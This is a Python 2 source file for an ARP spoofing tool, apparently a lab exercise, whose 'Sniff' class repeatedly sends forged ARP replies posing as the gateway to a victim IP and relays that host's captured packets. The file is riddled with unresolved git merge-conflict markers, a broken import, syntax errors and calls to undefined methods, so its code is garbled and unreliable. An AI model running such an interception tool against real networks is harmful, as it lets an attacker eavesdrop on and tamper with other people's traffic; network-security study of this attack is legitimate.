from socket import *
from struct import pack,unpack
from collections import OrderedDict
from os import popen
from multiprocessing

<<<<<<< HEAD
import time
=======
>>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
import sys
import threading

### UTILS ###
ETHERTYPE_IP = 0x0800
ETHERTYPE_ARP = 0x0806 

p8 = lambda x : pack("!B", x) 
p16 = lambda x : pack("!H", x) 

u8 = lambda x : unpack("!B", x)[0]
u16 = lambda x : unpack("!H", x)[0]

def mac2str(mac):
    ''' mac address to byte code '''
    return b"".join(chr(int(x, 16)) for x in str(mac).split(':'))

def str2mac(s):
    ''' byte code to mac address '''
    if isinstance(s, str):
        return ("%02x:"*6)[:-1] % tuple(map(ord, s))
    return ("%02x:"*6)[:-1] % tuple(s)

def getMyMac(iface):
    ''' Get my Mac address using RAW socket '''
    s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_IP ) )
    s.bind(( iface, ETHERTYPE_IP ))
    return str2mac( s.getsockname()[4] )

def getMyIP():
    ''' Get my ip using AF_INET socket '''
    s = socket( AF_INET, SOCK_DGRAM )
    s.connect(( "8.8.8.8", 1 ))
    return s.getsockname()[0]

def getMacByIP(iface, ip):
    ''' Get mac address by ip using arp broadcast '''
    response = ARP(iface).sendrecvarp( "REQUEST", target_mac="ff:ff:ff:ff:ff:ff", target_ip=ip )
<<<<<<< HEAD
    # print 'getmacbyip : ', response['arp']['psrc'], ip
=======
    print response['arp']['psrc'], ip
>>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
    if response['arp']['psrc'] == ip:
        return response['arp']['hwsrc']

def getGWIP():
    ''' Get default gateway IP for a local interface '''
    return popen("route|grep default|awk '{print $2}'").read()


class ARP:
    def __init__(self, iface):
        self.iface = iface
        self.sender_mac = getMyMac( self.iface )
        self.sender_ip = getMyIP()
        self.target_mac = "ff:ff:ff:ff:ff:ff"
        self.target_ip = "0.0.0.0"
         
    def sendarp(self, op, dst=None, src=None, sender_mac=None, sender_ip=None, target_mac=None, target_ip=None):
        ''' send raw arp packet '''
        packet_frame = OrderedDict()
        #### ETHERNET HEADER ###
        packet_frame['dst']    = mac2str( self.target_mac if dst is None else dst )
        packet_frame['src']    = mac2str( self.sender_mac if src is None else src )
        packet_frame['type']   = p16( ETHERTYPE_ARP )
        
        #### ARP HEADER ####
        packet_frame['hwtype'] = p16( 0x0001 )
        packet_frame['ptype']  = p16( ETHERTYPE_IP )
        packet_frame['hwlen']  = p8 ( 6 )
        packet_frame['plen']   = p8 ( 4 ) 
        packet_frame['op']     = p16( {'REQUEST':1, 'REPLY':2}[op] )
        packet_frame['hwsrc']  = mac2str(   self.sender_mac if sender_mac is None else sender_mac )
        packet_frame['psrc']   = inet_aton( self.sender_ip  if sender_ip  is None else sender_ip )
        packet_frame['hwdst']  = mac2str(   self.target_mac if target_mac is None else target_mac )
        packet_frame['pdst']   = inet_aton( self.target_ip  if target_ip  is None else target_ip )

        # print packet_frame
        packet = b"".join( packet_frame.values() )
        s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_IP ) )
        try:
            s.bind(( self.iface, ETHERTYPE_IP ))
            s.send( packet )
            s.close()

        except Exception, e:
            sys.exit( e )
<<<<<<< HEAD
=======

>>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142

    def sendrecvarp(self, op, dst=None, src=None, sender_mac=None, sender_ip=None, target_mac=None, target_ip=None, retry=0):
        ''' send arp packet and recv arp packet '''
        s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_ARP ) )
        s.bind(( self.iface, ETHERTYPE_ARP )) # FOR RECV ARP PACKET

        while retry >= 0:
            thread = threading.Thread(
                target = self.sendarp,
                args = ( op, dst, src, sender_mac, sender_ip, target_mac, target_ip )
            )
            thread.start()
            response = self.parseHeader( s.recvfrom(1024)[0] )
            thread.join()
            # print response
            s.close()

            if response['arp']['hwdst']==self.sender_mac and response['arp']['pdst']==self.sender_ip :
            # if response is not None:
                return response
            
            retry -= 1

    @staticmethod
    def parseHeader(packet):
        ''' parse packet and pick arp header '''
        ether = {
            'dst' : str2mac( packet[0:6]) ,
            'src' : str2mac( packet[6:12] ),
            'type': u16( packet[12:14] ),
        }
        if ( ether['type'] == ETHERTYPE_ARP ):
            arp = {
                'op'   : u16( packet[20:22] ),
                'hwsrc': str2mac( packet[22:28] ),
                'psrc' : inet_ntoa( packet[28:32] ),
                'hwdst': str2mac( packet[32:38] ),
                'pdst' : inet_ntoa( packet[38:42] )
            }
            return {'ether':ether, 'arp':arp}
        return {'ether':ether}
    

class Sniff(ARP):
    def __init__(self, arp, victim_ip):
        self.victim_ip  = victim_ip
<<<<<<< HEAD
        self.victim_mac = getMacByIP( arp.iface, self.victim_ip )
        self.router_ip  = getGWIP()
        # self.router_mac = getMacByIP( arp.iface, getGWIP() )
        self.router_mac= getMacByIP( arp.iface, '192.168.248.2' )
        print 'victim mac : ',self.victim_mac
        print self.router_mac


    def run(self):
        poison_thread = threading.Thread( target=self.poison, args=() )
        relay_thread  = threading.Thread( target=self.relay, args=() )
        
        poison_thread.start()
        relay_thread.start()

        poison_thread.join()
        relay_thread.join()

        

    def poison(self, interval=3):
        while True:
            arp.sendarp(
                op         = 'REPLY',
                sender_ip  = self.router_ip,
                target_mac = self.victim_mac, 
                target_ip  = self.victim_ip
                )
            # arp.sendarp(
            #     op         = 'REPLY',
            #     sender_ip  = self.victim_ip,
            #     target_mac = getMacByIP( arp.iface, self.router_ip ),
            #     target_ip  = self.router_ip
            #     )
            # arp.sendarp(
            #     op         = 'REPLY',
            #     sender_mac = '12:34:12:34:12:34',
            #     sender_ip  = '192.168.248.128',
            #     target_mac = getMacByIP( arp.iface, self.victim_ip ), 
            #     target_ip  = self.victim_ip
            #     )
            time.sleep( interval )
=======
        self.router_ip  = getGWIP()
        self.router_mac = getMacByIP( self.router_ip )

    def run(self):
        thread = Threading.Thread( target=self.relay, args=(,))
        thread.start()

    def poison(self):
        arp.sendarp(
            op         = 'REPLY',
            sender_ip  = self.router_ip,
            target_mac = getMacByIP( arp.iface, self.victim_ip ),
            target_ip  = self.victim_ip
            )
        # arp.sendarp(
        #     op         = 'REPLY',
        #     sender_ip  = self.victim_ip,
        #     target_mac = getMacByIP( arp.iface, self.router_ip ),
        #     target_ip  = self.router_ip
        #     )
>>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
    
    def restorePacketHeader(self, packet):
        ''' restore ethernet dst mac header '''
        restored_packet  = mac2str( self.router_mac )
<<<<<<< HEAD
        restored_packet += packet[6:]
        return restored_packet
=======
        restored_packet += packet
        return restored_packet
        
>>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142


    def relay(self):
        recv_s = socket( AF_PACKET, SOCK_RAW, htons( ETHERTYPE_IP ) )
        send_s = socket( AF_PACKET, SOCK_RAW, SOCK_RAW )
        send_s.bind(( arp.iface, SOCK_RAW ))
        while True:
            packet = recv_s.recvfrom(1024)[0]
<<<<<<< HEAD
            header = ARP.parseHeader( packet )
            # if header['arp']['pdst'] == self.router_ip and header['arp']['hwdst'] == getMyMac():
            try:
                # ignore arp packet
                if header['ether']['type'] == ETHERTYPE_ARP:
                    print "\nARP PACKET\n"
                    continue

                print 'ether, mac : ', header['ether']['dst'], getMyMac(arp.iface)
                print 'hwsrc, victim_mac', header['ether']['src'], self.victim_mac
                # if header['ether']['dst'] == getMyMac( arp.iface ) and header['ether']['src']==self.victim_mac:
                if header['ether']['dst'] == getMyMac( arp.iface ) and header['ether']['src']==self.victim_mac or header['ether']['src']=='00:50:56:c0:00:08':
                    print '\n\nPACKET SEND\n\n'
                    packet = self.restorePacketHeader( packet )         
                    send_s.send( packet )
            
            except Exception, e:
                print e
                pass
            
            print '--------------------------------------------'
            print "dst", header['ether']['dst']
            print 'src', header['ether']['src']
            print 'type %x' % header['ether']['type']
            print 'packet', `packet`[:50]
            print 'protocol', u8( packet[23] )
            print '--------------------------------------------'
=======
            header = arp.parseArpHeader( packet )
            # if header['arp']['pdst'] == self.router_ip and header['arp']['hwdst'] == getMyMac():
            
            # ignore arp packet
            if header['ether']['type'] == ETHERTYPE_ARP:
                continue

            packet = self.restorePacket( packet )         
            send_s.send( packet )



>>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142

if __name__ == '__main__':

<<<<<<< HEAD
if __name__ == '__main__':
    arp = ARP("ens33")
    # print getMacByIP( "ens33", "192.168.248.2")
    sniff = Sniff( arp, '192.168.248.130' )
    sniff.run()

        
'''
0000   00 50 56 e2 ad 1c 00 0c 29 19 fc d7 00 0c 29 4c
0010   ae cf 08 00 45 00 00 54 9e 70 40 00 40 01 d2 fd
0020   c0 a8 f8 82 08 08 08 08 08 00 7f d0 2a 77 00 05
0030   a1 d8 71 5b 4f 7c 00 00 08 09 0a 0b 0c 0d 0e 0f
0040   10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f
0050   20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f
0060   30 31 32 33 34 35 36 37 a1 d8 71 5b 4f 7c 00 00
0070   08 09 0a 0b 0c 0d

192.168.248.1            ether   00:50:56:c0:00:08   C                     ens33
192.168.248.2            ether   00:50:56:e2:ad:1c   C                     ens33
192.168.248.254          ether   00:50:56:f3:89:f6   C                     ens33
192.168.248.130          ether   00:0c:29:4c:ae:cf   C                     ens33


00:50:56:c0:00:08
'''
=======
    arp = ARP("ens33")

    sniff = Sniff( arp, '192.168.248.130' )
    sniff.poison()
>>>>>>> 5b06988b53ab0a63591a8166db88c56a84926142
